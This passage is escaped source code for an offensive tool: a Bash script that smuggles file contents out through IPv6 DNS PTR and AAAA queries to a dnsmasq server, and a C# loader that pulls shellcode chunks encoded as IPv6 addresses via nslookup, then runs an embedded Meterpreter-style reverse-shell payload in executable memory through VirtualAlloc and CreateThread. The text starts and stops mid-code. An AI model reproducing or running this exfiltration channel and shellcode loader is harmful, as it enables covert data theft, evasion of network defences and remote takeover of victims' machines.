IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -d makedns text.txt google.com address fe80:1234\"\n\r\n\r        echo \"example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -d getdata google.com 192.168.56.110\"\n\r\n\r        echo \"Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via IPv6 AAAA record Query\"\n\r\n\r        echo\n\r\n\r        fi\n\r\n\r \n\r\n\r        # uploading data via PTR queries (Client Side \"A\")\n\r\n\r        if [ $1 == \"-u\" ] \n\r\n\r        then\n\r\n\r                ###########\n\r\n\r                DefAddr=\"fe80:1111\"\n\r\n\r                if [ $6 == \"address\" ] \n\r\n\r                        then\n\r\n\r                        DefAddr=$7\n\r\n\r                        elif [ $6 == null ]\n\r\n\r                        then\n\r\n\r                        DefAddr=\"fe80:1111\"\n\r\n\r                fi\n\r\n\r                delaytime=0\n\r\n\r                if [ $4 == \"delay\" ] \n\r\n\r                        then\n\r\n\r                        delaytime=$5\n\r\n\r                        elif [ $4 == null ]\n\r\n\r                        then\n\r\n\r                        delaytime=0\n\r\n\r                fi\n\r\n\r \n\r\n\r                c=0                \n\r\n\r                octets=\"\"\n\r\n\r                tput setaf 9;\n\r\n\r                #echo \" \" &gt; DnsHost.txt\n\r\n\r                #echo \" \" &gt; TempDnsHost.txt\n\r\n\r                RecordsIDcounter=0\n\r\n\r                IPv6Oct=0\n\r\n\r                counts=0\n\r\n\r        echo\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[!] [Exfil/Uploading DATA] via IPv6 DNS PTR Record Queries\"\n\r\n\r        echo \"[!] Sending DNS Lookup to DNS Server: \" $3\n\r\n\r        echo \"[!] Sending DNS Lookup by Delay (sec): \" $delaytime\n\r\n\r        tput setaf 2;        \n\r\n\r        echo\n\r\n\r                        for op in `xxd -p -c 1 $2`; do\n\r\n\r \n\r\n\r                        #echo \"[!] injecting this text via IPv6 octet:\" \"`echo $op | xxd -r -p`\" \" ==byte==&gt; \" $op \n\r\n\r \n\r\n\r                        if (($IPv6Oct == 0))\n\r\n\r                                then\n\r\n\r                                octets+=$op\n\r\n\r                                ((IPv6Oct++))\n\r\n\r                                elif (($IPv6Oct == 1)) \n\r\n\r                                then\n\r\n\r                                octets+=$op\":\"\n\r\n\r                                IPv6Oct=0                                \n\r\n\r                                #debug only\n\r\n\r                                #echo \"[!] injecting this text via IPv6 octet:\" \"`echo $octets | xxd -r -p`\" \" ==byte==&gt; \" $octets \n\r\n\r                                #debug only\n\r\n\r                        fi                        \n\r\n\r                        ((c++))\n\r\n\r                                if(($c == 12))\n\r\n\r                                then\n\r\n\r                                tput setaf 2;                                \n\r\n\r                                echo --------------------------\n\r\n\r                                tput setaf 3;                                \n\r\n\r                                echo \"[!] Your IPv6 is : \" $DefAddr:\"${octets::-1}\"\n\r\n\r                                Data=\"${octets::-1}\"\n\r\n\r                                tput setaf 6;\n\r\n\r                                echo \"[!] Your Text/Data for this IPv6 is : \" `echo $Data | xxd -r -p `\n\r\n\r                                #echo $DefAddr:\"${octets::-1}\":$RecordsIDcounter $4 &gt;&gt; TempDnsHost.txt\n\r\n\r                                time=`date \'+%d/%m/%y %H:%M:%S\'`\n\r\n\r                                tput setaf 9;\n\r\n\r                                echo \"[&gt;] [$counts] [$time] Sending Text/Data via Nslookup Done\"\n\r\n\r                                MyIPv6address=$DefAddr:\"${octets::-1}\"\n\r\n\r                                nslookup -type=aaaa $MyIPv6address $3 | grep arpa\n\r\n\r                                tput setaf 2;        \n\r\n\r                                ((counts++))\n\r\n\r                                sleep $delaytime\n\r\n\r                                tput setaf 9;\n\r\n\r                                octets=\"\"\n\r\n\r                                c=0\n\r\n\r                                ((RecordsIDcounter++))                                \n\r\n\r                                else\n\r\n\r                                tput setaf 9;\n\r\n\r                                fi\n\r\n\r                        \n\r\n\r                        if(($RecordsIDcounter == 9999))\n\r\n\r                                then\n\r\n\r                                echo \"[!] Oops Your IPv6 counter (z) was upper than 9999 : \" \"${octets::-1}\".$RecordsIDcounter\n\r\n\r                                break\n\r\n\r                        fi\n\r\n\r                        done\n\r\n\r                #########\n\r\n\r        \n\r\n\r        tput setaf 2;\n\r\n\r        echo\n\r\n\r        echo \"[!] Sending Done by ($counts) Request.\"\n\r\n\r        echo\n\r\n\r        tput setaf 9;\n\r\n\r        \n\r\n\r        fi\n\r\n\r \n\r\n\r        # download data via AAAA records queries\n\r\n\r        if [ $1 == \"-d\" ] \n\r\n\r        then\n\r\n\r \n\r\n\r        # Syntax : NativePayload_IP6DNS.sh -d getdata domain_name DnsMasq_IPv4\" (CLIENT SIDE \"B\")\n\r\n\r        if [ $2 == \"getdata\" ] \n\r\n\r        then\n\r\n\r \n\r\n\r        tput setaf 9;        \n\r\n\r        echo \"[!] Downloading Mode , Dump Text DATA via DNS IPv6 AAAA Records \"        \n\r\n\r        tput setaf 2;        \n\r\n\r        echo \"[!] Sending DNS A Records Queries for Domain :\" $3 \"to DNSMASQ-Server:\" $4\n\r\n\r        echo \"[!] to dump test.txt file via AAAA records you should use this syntax in server side:\"\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[!] Syntax : NativePayload_IP6DNS.sh -d makedns test.txt google.com\"        \n\r\n\r \n\r\n\r        # old ver : nslookup -type=aaaa google.com 127.0.0.1 | grep AAAA | awk {\'print $5\'}  | sort -t: -k 8 -n                \n\r\n\r        PayloadLookups=`nslookup -type=aaaa $3  $4 | grep  AAAA | awk {\'print $5\'} | sort -t: -k 8 -n`\n\r\n\r        \n\r\n\r        # new ver : for some versions of nslookup you need this syntax\n\r\n\r                if (( `echo ${#PayloadLookups}` == 0 )) \n\r\n\r        then\n\r\n\r        PayloadLookups=`nslookup -type=aaaa $3  $4 | grep  Address: | awk {\'print $2\'} | sort -t: -k 8 -n`\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[&gt;] Warning , Nslookup Result via [grep AAAA] was null , Sending request again via [grep Address:]\"\n\r\n\r        echo \"[!] Warning , it means Nslookup query sent (2) times\"                \n\r\n\r        fi\n\r\n\r \n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[&gt;] Dumped this Text via DNS AAAA Record Query:\"\n\r\n\r        echo\n\r\n\r        AAAARecordscounter=0\n\r\n\r \n\r\n\r                for op in $PayloadLookups; do\n\r\n\r                if [[ $op != *\"#53\"* ]];\n\r\n\r                then\n\r\n\r                Lookups+=`echo $op | cut -d\':\' -f3`\n\r\n\r                Lookups+=`echo $op | cut -d\':\' -f4`\n\r\n\r                Lookups+=`echo $op | cut -d\':\' -f5`\n\r\n\r                Lookups+=`echo $op | cut -d\':\' -f6`\n\r\n\r                Lookups+=`echo $op | cut -d\':\' -f7`\n\r\n\r                echo $Lookups | xxd -r -p \n\r\n\r                Lookups=\"\"\n\r\n\r                ((AAAARecordscounter++))                \n\r\n\r                fi\n\r\n\r                done\n\r\n\r \n\r\n\r                echo\n\r\n\r                echo\n\r\n\r                tput setaf 2;        \n\r\n\r                echo \"[!] Dumping Done , Performed by\" $((AAAARecordscounter)) \"DNS AAAA Records for domain :\" $3 \"from Server:\" $4\n\r\n\r                echo\n\r\n\r        fi\n\r\n\r \n\r\n\r        # Creating DNS Server and DNSHOST.TXT file (SERVER SIDE \"B\")\n\r\n\r        # NativePayload_IP6DNS.sh -d makedns text-file mydomain.com address fe80:1111\n\r\n\r        if [ $2 == \"makedns\" ] \n\r\n\r        then        \n\r\n\r                DefAddr=\"fe80:1111\"\n\r\n\r                if [ $5 == \"address\" ] \n\r\n\r                        then\n\r\n\r                        DefAddr=$6\n\r\n\r                        elif [ $5 == null ]\n\r\n\r                        then\n\r\n\r                        DefAddr=\"fe80:1111\"\n\r\n\r                fi\n\r\n\r                c=0                \n\r\n\r                octets=\"\"\n\r\n\r                tput setaf 9;\n\r\n\r                echo \" \" &gt; DnsHost.txt\n\r\n\r                echo \" \" &gt; TempDnsHost.txt\n\r\n\r                RecordsIDcounter=0\n\r\n\r                IPv6Oct=0\n\r\n\r \n\r\n\r                        for op in `xxd -p -c 1 $3`; do\n\r\n\r                        #echo \"[!] injecting this text via IPv6 octet:\" \"`echo $op | xxd -r -p`\" \" ==byte==&gt; \" $op \n\r\n\r                        if (($IPv6Oct == 0))\n\r\n\r                                then\n\r\n\r                                octets+=$op\n\r\n\r                                ((IPv6Oct++))\n\r\n\r                                elif (($IPv6Oct == 1)) \n\r\n\r                                then\n\r\n\r                                octets+=$op\":\"\n\r\n\r                                IPv6Oct=0                                \n\r\n\r                                # debug only        \n\r\n\r                                #echo \"[!] injecting this text via IPv6 octet:\" \"`echo $octets | xxd -r -p`\" \" ==byte==&gt; \" $octets\n\r\n\r                                # debug only\n\r\n\r                                \n\r\n\r                        fi                        \n\r\n\r                        ((c++))\n\r\n\r                                if(($c == 10))\n\r\n\r                                then\n\r\n\r                                tput setaf 9;\n\r\n\r                                \n\r\n\r                                echo \"[!] injecting this text via IPv6 Address (10bytes) :\" \"`echo $octets | xxd -r -p`\" \" ==byte==&gt; \" $octets                                \n\r\n\r                                tput setaf 3;                                \n\r\n\r                                echo \"[!] Your IPv6 is : \" $DefAddr:\"${octets::-1}\":$RecordsIDcounter\n\r\n\r                                Data=\"${octets::-1}\"\n\r\n\r                                echo \"[!] Your Text/Data for this IPv6 is : \" `echo $Data | xxd -r -p `\n\r\n\r                                echo -------------------------\n\r\n\r                                echo $DefAddr:\"${octets::-1}\":$RecordsIDcounter $4 &gt;&gt; TempDnsHost.txt\n\r\n\r                                tput setaf 9;\n\r\n\r                                octets=\"\"\n\r\n\r                                c=0\n\r\n\r                                ((RecordsIDcounter++))                                \n\r\n\r                                else\n\r\n\r                                tput setaf 9;\n\r\n\r                                fi\n\r\n\r                        \n\r\n\r                        if(($RecordsIDcounter == 9999))\n\r\n\r                                then\n\r\n\r                                echo \"[!] Oops Your IPv6 counter (z) was upper than 9999 : \" \"${octets::-1}\".$RecordsIDcounter\n\r\n\r                                break\n\r\n\r                        fi\n\r\n\r                        done\n\r\n\r \n\r\n\r                        echo\n\r\n\r                        tput setaf 2;\n\r\n\r                        echo \"[!] DnsHost.txt Created by\" $RecordsIDcounter \"AAAA Records for Domain:\" $4 \n\r\n\r                        echo \"[!] you can use this DNSHOST.TXT file via Dnsmasq tool\"\n\r\n\r                        tput setaf 2;\n\r\n\r                        echo \"[!] to dump these AAAA records you should use this syntax in client side:\"\n\r\n\r                        tput setaf 9;\n\r\n\r                        echo \"[!] Syntax : NativePayload_IP6DNS.sh -d getdata domain_name DnsMasq_IPv4\"\n\r\n\r                        echo\n\r\n\r                        echo \"[&gt;] DNSMASQ Started by DNSHOST.TXT File\"\n\r\n\r                        echo\n\r\n\r                        tput setaf 9;\n\r\n\r                        # sort by -k4 : wxyz:wxyz:xxxx:XXXX:x:x:x:z\n\r\n\r                        cat TempDnsHost.txt | sort -t: -k4 -n &gt; DnsHost.txt\n\r\n\r                        `dnsmasq --no-hosts --no-daemon --log-queries -H DnsHost.txt`\n\r\n\r                        tput setaf 9;\n\r\n\r \n\r\n\r \n\r\n\r        fi\n\r\n\r \n\r\n\r        fi        \n\r\n\r        \n\r\n\r        # make DNS Server for Dump DATA via DNS PTR Queries (Server Side \"A\")\n\r\n\r        # Reading Mode (log data via dnsmasq log files)\n\r\n\r        if [ $1 == \"-r\" ] \n\r\n\r        then\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[&gt;] Reading Mode , DNSMASQ Started by this log file : /var/log/dnsmasq.log !\" \n\r\n\r        tput setaf 2;\n\r\n\r        echo \"\" &gt; /var/log/dnsmasq.log                \n\r\n\r        `dnsmasq --no-hosts --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log` &amp;        \n\r\n\r        filename=\"/var/log/dnsmasq.log\"        \n\r\n\r        fs=$(stat -c%s \"$filename\")\n\r\n\r        count=0\n\r\n\r        while true; do\n\r\n\r                tput setaf 2;                \n\r\n\r                sleep 10\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r                if [ \"$fs\" != \"$fs2\" ] ; \n\r\n\r                then\n\r\n\r                \n\r\n\r                tput setaf 6;\n\r\n\r                echo \"[!] /var/log/dnsmasq.log File has changed!\"                 \n\r\n\r                echo \"[!] Checking Queries\"\n\r\n\r                fs=$(stat -c%s \"$filename\")\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r \n\r\n\r                IP6PTRecordsTemp=`cat  $filename | grep PTR | awk {\'print $6\'} | tr -d \'.\'`                                \n\r\n\r                time=`date \'+%d/%m/%y %H:%M:%S\'`        \n\r\n\r                echo \"[!] [\"$time\"] Dump this Text via IPv6 PTR Queries\"\n\r\n\r                \n\r\n\r                tput setaf 9;\n\r\n\r                Dumptext=\"\"\n\r\n\r                for ops1 in `echo $IP6PTRecordsTemp`; do\n\r\n\r                \n\r\n\r                        IP6PTRecords=`echo \"${ops1::-15}\" | rev`\n\r\n\r                                        \n\r\n\r                        echo $IP6PTRecords | xxd -r -p\n\r\n\r                        Dumptext+=`echo $IP6PTRecords | xxd -r -p` \n\r\n\r                        done \n\r\n\r                echo\n\r\n\r                tput setaf 6;\n\r\n\r                echo \"[&gt;] this Text Saved to ExfilDump.txt\"\n\r\n\r                echo $Dumptext &gt; ExfilDump.txt\n\r\n\r                tput setaf 2;\n\r\n\r                else\n\r\n\r                fs=$(stat -c%s \"$filename\")\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r                tput setaf 2;\n\r\n\r                fi\n\r\n\r        done\n\r\n\r        fi\n\r\n\r \n\r\n\r \n\r\n\rNativePayload_IP6DNS.cs\n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Text;\n\r\n\rusing System.Net;\n\r\n\rusing System.Diagnostics;\n\r\n\rusing System.Data;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\r \n\r\n\rnamespace NativePayload_IP6DNS\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        static string payload = \"fc4883e4f0e8cc0000004151415052\"\n\r\n\r            + \"51564831d265488b5260488b521848\"\n\r\n\r            + \"8b5220488b7250480fb74a4a4d31c9\"\n\r\n\r            + \"4831c0ac3c617c022c2041c1c90d41\"\n\r\n\r            + \"01c1e2ed524151488b52208b423c48\"\n\r\n\r            + \"01d0668178180b020f85720000008b\"\n\r\n\r            + \"80880000004885c074674801d0508b\"\n\r\n\r            + \"4818448b40204901d0e35648ffc941\"\n\r\n\r            + \"8b34884801d64d31c94831c0ac41c1\"\n\r\n\r            + \"c90d4101c138e075f14c034c240845\"\n\r\n\r            + \"39d175d858448b40244901d066418b\"\n\r\n\r            + \"0c48448b401c4901d0418b04884801\"\n\r\n\r            + \"d0415841585e595a41584159415a48\"\n\r\n\r            + \"83ec204152ffe05841595a488b12e9\"\n\r\n\r            + \"4bffffff5d49be7773325f33320000\"\n\r\n\r            + \"41564989e64881eca00100004989e5\"\n\r\n\r            + \"49bc0200115cc0a8013241544989e4\"\n\r\n\r            + \"4c89f141ba4c772607ffd54c89ea68\"\n\r\n\r            + \"010100005941ba29806b00ffd56a05\"\n\r\n\r            + \"415e50504d31c94d31c048ffc04889\"\n\r\n\r            + \"c248ffc04889c141baea0fdfe0ffd5\"\n\r\n\r            + \"4889c76a1041584c89e24889f941ba\"\n\r\n\r            + \"99a57461ffd585c0740a49ffce75e5\"\n\r\n\r            + \"e8930000004883ec104889e24d31c9\"\n\r\n\r            + \"6a0441584889f941ba02d9c85fffd5\"\n\r\n\r            + \"83f8007e554883c4205e89f66a4041\"\n\r\n\r            + \"59680010000041584889f24831c941\"\n\r\n\r            + \"ba58a453e5ffd54889c34989c74d31\"\n\r\n\r            + \"c94989f04889da4889f941ba02d9c8\"\n\r\n\r            + \"5fffd583f8007d2858415759680040\"\n\r\n\r            + \"000041586a005a41ba0b2f0f30ffd5\"\n\r\n\r            + \"575941ba756e4d61ffd549ffcee93c\"\n\r\n\r            + \"ffffff4801c34829c64885f675b441\"\n\r\n\r            + \"ffe7586a005949c7c2f0b5a256ffd5\";\n\r\n\r \n\r\n\r        public static DataTable _IPV6_IPAddress_Payloads;        \n\r\n\r \n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r \n\r\n\r            try\n\r\n\r            {              \n\r\n\r                _IPV6_IPAddress_Payloads = new DataTable();\n\r\n\r                \n\r\n\r                _IPV6_IPAddress_Payloads.Columns.Add(\"Pay_id\", typeof(int));\n\r\n\r                _IPV6_IPAddress_Payloads.Columns.Add(\"Payload\", typeof(string));\n\r\n\r                _IPV6_IPAddress_Payloads.DefaultView.Sort = \"Pay_id\";\n\r\n\r                _IPV6_IPAddress_Payloads.DefaultView.ToTable(\"Pay_id\");\n\r\n\r \n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"NativePayload_IPv6DNS tool Published by Damon Mohammadbagher\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;                \n\r\n\r                Console.WriteLine(\"Transferring Backdoor Payloads by IPv6_Address and DNS traffic ;)\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                if (args[0].ToUpper() == \"PAYLOAD\") \n\r\n\r                {\n\r\n\r                    Console.WriteLine(\"Note this code supported only 99 * 10 = 990 bytes payload \");\n\r\n\r                    Console.WriteLine(\"Note this code supported only 99 lines foreach 10 bytes payload \\n\");\n\r\n\r \n\r\n\r                    int c = 0;\n\r\n\r                    int counter = 0;\n\r\n\r                    int b = 0;\n\r\n\r                    string temp = \"\";\n\r\n\r                    foreach (char item in payload)\n\r\n\r                    {\n\r\n\r                        if (c &gt;= 3)\n\r\n\r                        { temp += item + \":\"; c = 0; }\n\r\n\r                        else if (c &lt;= 4) { temp += item; c++; }\n\r\n\r \n\r\n\r                        b++;\n\r\n\r \n\r\n\r                        if (b &gt;= 20)\n\r\n\r                        {\n\r\n\r \n\r\n\r                            if (counter &lt;= 99)\n\r\n\r                            {\n\r\n\r                                Console.Write(\"fe80:\" + \"1111:\" + temp + \"ae\" + counter);\n\r\n\r                            }\n\r\n\r                            else if (counter &gt;= 100)\n\r\n\r                            {\n\r\n\r                                Console.Write(\"fe80:\" + \"1111:\" + temp + \"a\" + counter);\n\r\n\r                            }\n\r\n\r                            else if (counter &gt;= 999)\n\r\n\r                            {\n\r\n\r                                Console.Write(\"fe80:\" + \"1111:\" + temp + \"\" + counter);\n\r\n\r                            }\n\r\n\r                            Console.WriteLine(\"\"); b = 0;\n\r\n\r                            temp = \"\";\n\r\n\r                            counter++;\n\r\n\r                        }\n\r\n\r \n\r\n\r                    }\n\r\n\r                    \n\r\n\r                }else if (args[0].ToUpper() == \"NULL\")\n\r\n\r                {\n\r\n\r                    Console.WriteLine(\"Note this code supported only 99 * 10 = 990 bytes payload \");\n\r\n\r                    Console.WriteLine(\"Note this code supported only 99 lines foreach 10 bytes payload \\n\");\n\r\n\r                   \n\r\n\r                        payload = args[1];\n\r\n\r                        int c = 0;\n\r\n\r                        int counter = 0;\n\r\n\r                        int b = 0;\n\r\n\r                        string temp = \"\";\n\r\n\r                        foreach (char item in payload)\n\r\n\r                        {\n\r\n\r                            if (c &gt;= 3)\n\r\n\r                            { temp += item + \":\"; c = 0; }\n\r\n\r                            else if (c &lt;= 4) { temp += item; c++; }\n\r\n\r \n\r\n\r                            b++;\n\r\n\r \n\r\n\r                            if (b &gt;= 20)\n\r\n\r                            {\n\r\n\r \n\r\n\r                                if (counter &lt;= 99)\n\r\n\r                                {\n\r\n\r                                    Console.Write(\"fe80:\" + \"1111:\" + temp + \"ae\" + counter);\n\r\n\r                                }\n\r\n\r                                else if (counter &gt;= 100)\n\r\n\r                                {\n\r\n\r                                    Console.Write(\"fe80:\" + \"1111:\" + temp + \"a\" + counter);\n\r\n\r                                }\n\r\n\r                                else if (counter &gt;= 999)\n\r\n\r                                {\n\r\n\r                                    Console.Write(\"fe80:\" + \"1111:\" + temp + \"\" + counter);\n\r\n\r                                }\n\r\n\r                                Console.WriteLine(\"\"); b = 0;\n\r\n\r                                temp = \"\";\n\r\n\r                                counter++;\n\r\n\r                            }\n\r\n\r \n\r\n\r                        }\n\r\n\r                    \n\r\n\r                }\n\r\n\r                else\n\r\n\r                {\n\r\n\r                    try\n\r\n\r                    {\n\r\n\r                       __nslookup(args[0], args[1]);\n\r\n\r \n\r\n\r                        Exploit(_IPV6_IPAddress_Payloads);\n\r\n\r                    }\n\r\n\r                    catch (Exception exp)\n\r\n\r                    {\n\r\n\r                        Console.WriteLine(\"Main exploit : \" + exp.Message);\n\r\n\r                    }                    \n\r\n\r                }\n\r\n\r \n\r\n\r            }\n\r\n\r            catch (Exception main)\n\r\n\r            {\n\r\n\r                Console.WriteLine(\"Main : \" + main.Message);\n\r\n\r            }\n\r\n\r \n\r\n\r        }\n\r\n\r \n\r\n\r        static void Exploit(DataTable payloads)\n\r\n\r        {\n\r\n\r            string ss = \"\";\n\r\n\r            byte[] __Bytes = new byte[payloads.Rows.Count * 2];\n\r\n\r            for (int i = 0; i &lt; payloads.Rows.Count; i++)\n\r\n\r            {\n\r\n\r                try\n\r\n\r                {\n\r\n\r                    // with Round-robin this code was necessary to sort payloads ;)\n\r\n\r                    EnumerableRowCollection filter = payloads.AsEnumerable().Where(r =&gt; r.Field&lt;int&gt;(\"Pay_id\") == i);\n\r\n\r                    foreach (DataRow item in filter)\n\r\n\r                    {\n\r\n\r                        ss += item.ItemArray[1].ToString();\n\r\n\r                    }\n\r\n\r                }\n\r\n\r                catch (Exception)\n\r\n\r                {\n\r\n\r \n\r\n\r \n\r\n\r                }\n\r\n\r            }\n\r\n\r            try\n\r\n\r            {\n\r\n\r                Console.Write(\"\");\n\r\n\r                int Oonagi = payloads.Rows.Count * 2;\n\r\n\r                int t = 0;\n\r\n\r                for (int k = 0; k &lt; Oonagi; k++)\n\r\n\r                {\n\r\n\r                    string _tmp1 = ss.Substring(t, 2);\n\r\n\r                    byte current1 = Convert.ToByte(_tmp1, 16);\n\r\n\r                    // debug only , print payload string\n\r\n\r                    Console.Write(_tmp1);\n\r\n\r                    __Bytes[k] = current1;\n\r\n\r                    t++;\n\r\n\r                    t++;\n\r\n\r \n\r\n\r                }\n\r\n\r \n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(\"Bingo Meterpreter session by IPv6_Address and DNS traffic ;)\");\n\r\n\r                Console.WriteLine(\"DNS Round-Robin Supported\");\n\r\n\r                UInt32 funcAddr = VirtualAlloc(0, (UInt32)__Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                Marshal.Copy(__Bytes, 0, (IntPtr)(funcAddr), __Bytes.Length);\n\r\n\r                IntPtr hThread = IntPtr.Zero;\n\r\n\r                UInt32 threadId = 0;\n\r\n\r                IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                WaitForSingleObject(hThread, 0xFFFFFFFF);\n\r\n\r            }\n\r\n\r            catch (Exception ops1)\n\r\n\r            {\n\r\n\r \n\r\n\r                Console.WriteLine(\"Exploit: \" + ops1.Message);\n\r\n\r            }\n\r\n\r        }\n\r\n\r                                   \n\r\n\r        public static void __nslookup(string DNS_AAAA_A, string DnsServer)\n\r\n\r        {\n\r\n\r          \n\r\n\r            int breakpoint_1 = 0;\n\r\n\r            string last_octet_tmp = \"\";\n\r\n\r            \n\r\n\r            /// Length for injected payloads by IPv6 Addresss \n\r\n\r            int Final_payload_count = 0;          \n\r\n\r           \n\r\n\r            try\n\r\n\r            {\n\r\n\r \n\r\n\r                /// Make DNS traffic for getting Meterpreter Payloads by nslookup\n\r\n\r                ProcessStartInfo ns_Prcs_info = new ProcessStartInfo(\"nslookup.exe\", DNS_AAAA_A + \" \" + DnsServer);\n\r\n\r                ns_Prcs_info.RedirectStandardInput = true;\n\r\n\r                ns_Prcs_info.RedirectStandardOutput = true;\n\r\n\r                ns_Prcs_info.UseShellExecute = false;\n\r\n\r                /// you can use Thread Sleep here \n\r\n\r\n\r\n\r                Process nslookup = new Process();\n\r\n\r                nslookup.StartInfo = ns_Prcs_info;\n\r\n\r                nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n\r\n\r                nslookup.Start();\n\r\n\r                \n\r\n\r                string result_Line0 = \"\";\n\r\n\r                string computerList = nslookup.StandardOutput.ReadToEnd();\n\r\n\r                string[] All_lines = computerList.Split(\'\\t\', \'n\');\n\r\n\r                int PayloadLines_current_id = 0;\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r                /// Getting First Line of Meterpreter Payload Lines ;)\n\r\n\r                /// Getting First Line of Meterpreter Payload Lines ;)\n\r\n\r                try\n\r\n\r                {                                                        \n\r\n\r                    for (int x = 0; x &lt; All_lines.Length; x++)\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                        if (All_lines[x].ToUpper().Contains(\"ADDRESSES:\"))\n\r\n\r                        {\n\r\n\r                            /// Getting First Line of Meterpreter Payload Lines ;)\n\r\n\r                            int f = All_lines[x].IndexOf(\"Addresses:  \") + \"Addresses:  \".Length;\n\r\n\r                            int l = All_lines[x].LastIndexOf(\"\\r\\n\");\n\r\n\r                            result_Line0 = All_lines[x].Substring(f, l - f);\n\r\n\r                            breakpoint_1 = x;\n\r\n\r                            break;\n\r\n\r                        }\n\r\n\r \n\r\n\r                    }\n\r\n\r                    Console.WriteLine();\n\r\n\r                    // Debug only {show address line 0}\n\r\n\r                    //Console.Write(result_Line0);\n\r\n\r                    Console.WriteLine();\n\r\n\r                    /// normalize Address 0:0:0 ==&gt; 0000:0000:0000\n\r\n\r                    /// normalize Address 0:0:0 ==&gt; 0000:0000:0000\n\r\n\r                    string[] temp_normalize0 = result_Line0.Split(\':\');\n\r\n\r \n\r\n\r                    /// finding hidden zero in address octets ;)\n\r\n\r                    for (int ix = 0; ix &lt; temp_normalize0.Length; ix++)\n\r\n\r                    {\n\r\n\r                        int count = temp_normalize0[ix].Length;\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                        if (count &lt; 4)\n\r\n\r                        {\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                            for (int j = 0; j &lt; 4 - count; j++)\n\r\n\r                            {\n\r\n\r                                temp_normalize0[ix] = \"0\" + temp_normalize0[ix];\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                        if (ix == temp_normalize0.Length - 1) { Console.ForegroundColor = ConsoleColor.DarkCyan; }\n\r\n\r                        if (ix &lt; temp_normalize0.Length - 6 &amp;&amp; ix &gt;= temp_normalize0.Length - 8) { Console.ForegroundColor = ConsoleColor.DarkCyan; }\n\r\n\r                        if (ix == temp_normalize0.Length - 2 || ix == temp_normalize0.Length - 3 || ix == temp_normalize0.Length - 4 || ix == temp_normalize0.Length - 5 || ix == temp_normalize0.Length - 6)\n\r\n\r                        {\n\r\n\r                           //// dump Injected Payloads from IPv6 Address to List ;)\n\r\n\r                           //// Note this code supported only 99 * 10 = 990 bytes payload \n\r\n\r                           //// you can change here to getting more than 990 bytes \n\r\n\r                         \n\r\n\r                             if (temp_normalize0[7].StartsWith(\"ae\"))\n\r\n\r                             {\n\r\n\r                                 object[] __X = {Convert.ToInt32(temp_normalize0[7].Remove(0,2)), temp_normalize0[ix]};\n\r\n\r                                 _IPV6_IPAddress_Payloads.Rows.Add(__X);\n\r\n\r \n\r\n\r                             } else if(temp_normalize0[7].StartsWith(\"0ae\"))\n\r\n\r                             {\n\r\n\r                                 object[] __X = {Convert.ToInt32(temp_normalize0[7].Remove(0,3)), temp_normalize0[ix]};\n\r\n\r                                 _IPV6_IPAddress_Payloads.Rows.Add(__X);\n\r\n\r                             }\n\r\n\r \n\r\n\r                             //// you can change here to getting more than 990 bytes \n\r\n\r \n\r\n\r                             //else if (temp_normalize0[7].StartsWith(\"a\"))\n\r\n\r                             //{\n\r\n\r                             //    object[] __X = { Convert.ToInt32(temp_normalize0[7].Remove(0, 1)), temp_normalize0[ix] };\n\r\n\r                             //    _IPV6_IPAddress_Payloads.Rows.Add(__X);\n\r\n\r                             //}                                                    \n\r\n\r                        }\n\r\n\r \n\r\n\r                        Console.Write(temp_normalize0[ix] + \" \");                      \n\r\n\r \n\r\n\r                        // checking Bytes and Sorting\n\r\n\r                        last_octet_tmp = \"\";\n\r\n\r                        if (ix == temp_normalize0.Length - 1)\n\r\n\r                        {\n\r\n\r                            // this is last octet of IPv6 address\n\r\n\r                            last_octet_tmp += temp_normalize0[ix];\n\r\n\r \n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                    // Debug only {show address line 0}\n\r\n\r                    Console.Write(\" ==&gt; \" + result_Line0);\n\r\n\r                    Console.WriteLine();\n\r\n\r                    //last_octet_tmp = String.Format(\"{0:x2}{1:x2}{2:x2}\");\n\r\n\r                    try\n\r\n\r                    {\n\r\n\r                        if (last_octet_tmp.StartsWith(\"ae\"))\n\r\n\r                        {  \n\r\n\r                                                       \n\r\n\r                            PayloadLines_current_id = Convert.ToInt32(last_octet_tmp.ToString().Remove(0, 2));\n\r\n\r                           \n\r\n\r                            Final_payload_count++;\n\r\n\r                        }\n\r\n\r                        else if (last_octet_tmp.StartsWith(\"0ae\"))\n\r\n\r                        {\n\r\n\r                                                    \n\r\n\r                            PayloadLines_current_id = Convert.ToInt32(last_octet_tmp.ToString().Remove(0, 3));\n\r\n\r                          \n\r\n\r                            Final_payload_count++;\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                    catch 